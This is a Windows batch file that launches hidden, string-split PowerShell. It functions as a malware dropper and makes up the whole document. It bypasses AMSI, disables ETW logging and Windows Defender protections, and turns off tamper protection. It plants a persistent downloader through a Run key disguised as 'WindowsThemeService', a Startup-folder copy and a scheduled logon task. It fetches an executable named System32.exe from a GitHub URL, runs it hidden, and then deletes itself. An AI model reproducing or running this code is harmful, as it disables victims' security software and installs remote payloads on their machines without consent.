@echo off
set p=powershell -w hidden -ep bypass -c
%p% "$E='SilentlyContinue';$ErrorActionPreference=$E;try{$a=[Ref].Assembly.GetType('Sy'+'stem.Man'+'agement.Aut'+'omation.Am'+'siUtils');$f=$a.GetField('am'+'siInit'+'Failed','NonP'+'ublic,St'+'atic');$f.SetValue($null,$true)}catch{};try{$t=[Ref].Assembly.GetType('Sy'+'stem.Man'+'agement.Aut'+'omation.Tra'+'cing.PSEtw'+'LogProvider');$m=$t.GetField('etw'+'Provider','NonP'+'ublic,St'+'atic');$m.SetValue($null,0)}catch{};try{$x='Add'+'-Mp'+'Preference';& $x -ExclusionExtension '.exe','.bat';$y='Set'+'-Mp'+'Preference';& $y -DisableRealtimeMonitoring 1 -DisableBehaviorMonitoring 1 -DisableBlockAtFirstSeen 1 -DisableIOAVProtection 1 -DisableScriptScanning 1 -DisableArchiveScanning 1 -DisableIntrusionPreventionSystem 1 -DisableScanningNetworkFiles 1 -SubmitSamplesConsent 2 -MAPSReporting 0 -HighThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6}catch{};$d=$env:APPDATA+'\Micro'+'soft\Win'+'dows\The'+'mes';if(!(Test-Path $d)){md $d -Force|Out-Null};$s='`$E=''SilentlyContinue'';`$ErrorActionPreference=`$E;`$t=`$env:TEMP;`$r=[IO.Path]::GetRandomFileName().Split(''.'')[0];`$p=\"`$t\`$r.exe\";try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};`$w=New-Object Net.WebClient;`$w.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'');`$w.DownloadFile(''https://git'+'hub.com/din'+'mihaile/hvh2/raw/refs/heads/main/Sys'+'tem32.exe'',`$p);Start-Process `$p -WindowStyle Hidden;sleep 2;rm `$p -Force';$s|Out-File \"$d\aero.ps1\" -Encoding ASCII -Force;'@ec'+'ho off'+\"`npow'+'ershell -w hid'+'den -ep by'+'pass -f `\"$d\aero.ps1`\"\"|Out-File \"$d\theme.bat\" -Encoding ASCII -Force;New-ItemProperty -Path 'HK'+'CU:\Soft'+'ware\Micro'+'soft\Win'+'dows\Current'+'Version\Run' -Name 'Windows'+'Theme'+'Service' -Value \"`\"$d\theme.bat`\"\" -PropertyType String -Force|Out-Null;cp \"$d\theme.bat\" \"$env:APPDATA\Micro'+'soft\Win'+'dows\Start Menu\Pro'+'grams\Start'+'up\Windows'+'Theme.bat\" -Force;try{$act=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-w hidden -ep bypass -f `\"$d\aero.ps1`\"\";;$trg=New-ScheduledTaskTrigger -AtLogOn;$prc=New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest;$set=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;Register-ScheduledTask -TaskName 'WindowsThemeService' -Action $act -Trigger $trg -Principal $prc -Settings $set -Force|Out-Null}catch{};$t=$env:TEMP;$r=[IO.Path]::GetRandomFileName().Split('.')[0];$p=\"$t\$r.exe\";try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$w.DownloadFile('https://git'+'hub.com/din'+'mihaile/hvh2/raw/refs/heads/main/Sys'+'tem32.exe',$p);Start-Process $p -WindowStyle Hidden;sleep 3;rm $p -Force" >nul 2>&1
set r=reg
set a=add
set h=HKLM\SOFTWARE
set p1=\Policies\Microsoft\Windows Defender
set p2=\Real-Time Protection
set p3=\Microsoft\Windows Defender
set p4=\Features
set p5=\Exclusions\Extensions
set v=/v
set t=/t
set d=/d
set f=/f
%r% %a% "%h%%p1%" %v% DisableAntiSpyware %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%" %v% DisableAntiVirus %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%%p2%" %v% DisableRealtimeMonitoring %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%%p2%" %v% DisableBehaviorMonitoring %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%%p2%" %v% DisableOnAccessProtection %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p1%%p2%" %v% DisableScanOnRealtimeEnable %t% REG_DWORD %d% 1 %f% >nul 2>&1
%r% %a% "%h%%p3%%p4%" %v% TamperProtection %t% REG_DWORD %d% 0 %f% >nul 2>&1
%r% %a% "%h%%p3%%p5%" %v% exe %t% REG_SZ %d% "0" %f% >nul 2>&1
%r% %a% "%h%%p3%%p5%" %v% bat %t% REG_SZ %d% "0" %f% >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
del "%~f0" >nul 2>&1
